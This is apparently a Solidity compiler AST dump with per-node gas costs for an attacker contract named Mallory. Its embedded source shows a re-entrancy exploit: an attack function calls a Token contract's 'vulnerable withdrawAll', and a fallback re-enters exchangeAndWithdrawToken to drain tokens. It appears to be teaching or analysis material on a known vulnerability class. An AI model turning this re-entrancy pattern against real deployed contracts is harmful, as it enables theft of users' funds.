       Source: "{\r\n        // exchange nearly all available ether to tokens\r\n        uint avail = address(this).balance - 2;\r\n        t.exchangeEther.value(avail)(avail);\r\n        // deposit the last remaining ether\r\n        t.depositEther.value(address(this).balance)();\r\n    }"
      VariableDeclarationStatement
         Gas costs: 422
         Source: "uint avail = address(this).balance - 2"
        VariableDeclaration "avail"
           Type: uint256
           Source: "uint avail"
          ElementaryTypeName uint
             Source: "uint"
        BinaryOperation using operator -
           Type: uint256
           Source: "address(this).balance - 2"
          MemberAccess to member balance
             Type: uint256
             Source: "address(this).balance"
            FunctionCall
               Type: address payable
               Source: "address(this)"
              ElementaryTypeNameExpression address
                 Type: type(address)
                 Source: "address"
              Identifier this
                 Type: contract Mallory
                 Source: "this"
          Literal, token: [no token] value: 2
             Type: int_const 2
             Source: "2"
      ExpressionStatement
         Gas costs: [???]
         Source: "t.exchangeEther.value(avail)(avail)"
        FunctionCall
           Type: tuple()
           Source: "t.exchangeEther.value(avail)(avail)"
          FunctionCall
             Type: function (uint256) payable external
             Source: "t.exchangeEther.value(avail)"
            MemberAccess to member value
               Type: function (uint256) returns (function (uint256) payable external)
               Source: "t.exchangeEther.value"
              MemberAccess to member exchangeEther
                 Type: function (uint256) payable external
                 Source: "t.exchangeEther"
                Identifier t
                   Type: contract Token
                   Source: "t"
            Identifier avail
               Type: uint256
               Source: "avail"
          Identifier avail
             Type: uint256
             Source: "avail"
      ExpressionStatement
         Gas costs: [???]
         Source: "t.depositEther.value(address(this).balance)()"
        FunctionCall
           Type: tuple()
           Source: "t.depositEther.value(address(this).balance)()"
          FunctionCall
             Type: function () payable external
             Source: "t.depositEther.value(address(this).balance)"
            MemberAccess to member value
               Type: function (uint256) returns (function () payable external)
               Source: "t.depositEther.value"
              MemberAccess to member depositEther
                 Type: function () payable external
                 Source: "t.depositEther"
                Identifier t
                   Type: contract Token
                   Source: "t"
            MemberAccess to member balance
               Type: uint256
               Source: "address(this).balance"
              FunctionCall
                 Type: address payable
                 Source: "address(this)"
                ElementaryTypeNameExpression address
                   Type: type(address)
                   Source: "address"
                Identifier this
                   Type: contract Mallory
                   Source: "this"
  FunctionDefinition "attack" - public
     Source: "function attack() public payable {\r\n        // call vulnerable withdrawAll\r\n        t.withdrawAll();\r\n    }"
    ParameterList
       Gas costs: 0
       Source: "()"
    ParameterList
       Gas costs: 0
       Source: ""
    Block
       Source: "{\r\n        // call vulnerable withdrawAll\r\n        t.withdrawAll();\r\n    }"
      ExpressionStatement
         Gas costs: [???]
         Source: "t.withdrawAll()"
        FunctionCall
           Type: tuple()
           Source: "t.withdrawAll()"
          MemberAccess to member withdrawAll
             Type: function () external
             Source: "t.withdrawAll"
            Identifier t
               Type: contract Token
               Source: "t"
  FunctionDefinition "" - public
     Source: "function () external payable {\r\n        if (!abort) {\r\n            // stop the second re-entrancy, which is caused by the transfer\r\n            abort = true;  \r\n            t.exchangeAndWithdrawToken(t.getTokenCount());\r\n        }\r\n    }"
    ParameterList
       Gas costs: 0
       Source: "()"
    ParameterList
       Gas costs: 0
       Source: ""
    Block
       Source: "{\r\n        if (!abort) {\r\n            // stop the second re-entrancy, which is caused by the transfer\r\n            abort = true;  \r\n            t.exchangeAndWithdrawToken(t.getTokenCount());\r\n        }\r\n    }"
      IfStatement
         Source: "if (!abort) {\r\n            // stop the second re-entrancy, which is caused by the transfer\r\n            abort = true;  \r\n            t.exchangeAndWithdrawToken(t.getTokenCount());\r\n        }"
        UnaryOperation (prefix) !
           Type: bool
           Gas costs: 292
           Source: "!abort"
          Identifier abort
             Type: bool
             Source: "abort"
        Block
           Source: "{\r\n            // stop the second re-entrancy, which is caused by the transfer\r\n            abort = true;  \r\n            t.exchangeAndWithdrawToken(t.getTokenCount());\r\n        }"
          ExpressionStatement
             Gas costs: 20317
             Source: "abort = true"
            Assignment using operator =
               Type: bool
               Source: "abort = true"
              Identifier abort
                 Type: bool
                 Source: "abort"
              Literal, token: true value: true
                 Type: bool
                 Source: "true"
          ExpressionStatement
             Gas costs: [???]
             Source: "t.exchangeAndWithdrawToken(t.getTokenCount())"
            FunctionCall
               Type: tuple()
               Source: "t.exchangeAndWithdrawToken(t.getTokenCount())"
              MemberAccess to member exchangeAndWithdrawToken
                 Type: function (uint256) external
                 Source: "t.exchangeAndWithdrawToken"
                Identifier t
                   Type: contract Token
                   Source: "t"
              FunctionCall
                 Type: uint256
                 Source: "t.getTokenCount()"
                MemberAccess to member getTokenCount
                   Type: function () view external returns (uint256)
                   Source: "t.getTokenCount"
                  Identifier t
                     Type: contract Token
                     Source: "t"
